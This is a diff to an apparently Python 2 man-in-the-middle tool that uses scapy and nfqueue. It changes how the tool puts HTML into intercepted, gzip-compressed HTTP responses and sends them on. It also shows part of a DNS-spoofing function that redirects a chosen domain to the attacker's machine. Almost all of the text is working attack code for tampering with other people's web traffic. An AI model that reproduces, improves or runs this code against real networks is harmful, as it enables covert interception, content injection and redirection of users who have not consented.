@@ -293,9 +293,9 @@ class Parser():
 			# Recompress data if necessary
 			if 'Content-Encoding: gzip' in headers:
 				if body != '':
-#					debugger = open('/home/user/projects/injectedBody', 'w')
-#					debugger.write(body)
-#					debugger.close()
+					#debugger = open('injectedBody', 'w') #########################################
+					#debugger.write(body) #########################################
+					#debugger.close() #########################################
 					try:
 						comp_body = StringIO()
 						f = gzip.GzipFile(fileobj=comp_body, mode='w', compresslevel = 9)
@@ -308,8 +308,7 @@ class Parser():
 							pkt[IP].len = len(str(pkt))
 							del pkt[IP].chksum
 							del pkt[TCP].chksum
-							payload.set_verdict(nfqueue.NF_DROP)
-							send(pkt)
+							payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
 							print '[-] Could not recompress html, sent packet as is'
 							self.html_url = None
 							return
@@ -324,16 +323,15 @@ class Parser():
 			del pkt[IP].chksum
 			del pkt[TCP].chksum
 			try:
-				send(pkt)
+				payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
 				print R+'[!] Injected HTML into packet for '+W+self.html_url
 				logger.write('[!] Injected HTML into packet for '+self.html_url)
 				self.block_acks.append(ack)
-				payload.set_verdict(nfqueue.NF_DROP)
 				self.html_url = None
-			except Exception:
+			except Exception as e:
 				payload.set_verdict(nfqueue.NF_ACCEPT)
 				self.html_url = None
-				print '[-] Failed to inject packet'
+				print '[-] Failed to inject packet', e
 				return
 
 			if len(self.block_acks) > 30:
@@ -717,7 +715,6 @@ class Parser():
 			logger.write('[!] Decoded:'+decoded+'\n')
 
 	# Spoof DNS for a specific domain to point to your machine
-	# Make this more reliable by blocking all DNS responses from the server using the IP_src maybe a self.dnsSrc var
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
 		localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 		if self.args.dnsspoof:
